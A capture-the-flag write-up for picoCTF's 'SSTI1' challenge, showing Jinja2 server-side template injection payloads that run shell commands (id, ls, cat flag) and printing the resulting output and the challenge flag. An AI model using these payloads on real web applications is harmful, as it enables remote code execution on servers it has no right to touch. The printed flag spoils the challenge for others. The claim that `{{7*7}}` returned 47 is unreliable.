- ## Challenge Info
	- **Name:** SSTI1
	- **Category:** [[Web Exploitation]][[picoCTF 2025]]
	- **Level:** [[Easy]]
	- **Link:** https://play.picoctf.org/practice/challenge/492
	- **Description:** 
	  I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:62315/)!
---
- ## Problem Understanding
	-  [[SSTI]] stands for Server Side Template Injection
- ## Approach and Steps
  1
	- `{{7*7}}` returned `47` [therefore](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) it is  Jinja2 (Python).
- 2
	- Ran [`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/)
	- Got `uid=0(root) gid=0(root) groups=0(root)` in response, this means that the exploit works.
	  > Now i have RCE
- 3
	- Run: `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`
	- Got 
	  ``__pycache__
	  app.py
	  flag
	  requirements.txt``
- 4
	- Running `{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}` gives the flag.
- ## Solution
- The flag was: `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bd4cfc64}`
  ---